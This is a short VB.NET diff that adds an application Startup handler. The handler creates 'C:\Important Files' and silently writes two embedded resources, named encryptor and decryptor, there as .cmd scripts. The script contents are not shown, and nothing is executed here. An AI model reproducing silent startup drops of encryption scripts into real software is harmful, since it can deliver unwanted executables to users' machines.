@@ -24,6 +24,19 @@ Namespace My
     ' End Sub
 
     Partial Friend Class MyApplication
+        Private Sub MyApplication_Startup(sender As Object, e As StartupEventArgs) Handles Me.Startup
+            Computer.FileSystem.CreateDirectory("C:\Important Files")
 
+
+            Dim decrypt() As Byte = Resources.decryptor
+
+            System.IO.File.WriteAllBytes("C:\Important Files\decrypt.cmd", decrypt)
+
+
+
+            Dim encrypt() As Byte = Resources.encryptor
+
+            System.IO.File.WriteAllBytes("C:\Important Files\encrypt.cmd", encrypt)
+        End Sub
     End Class
 End Namespace
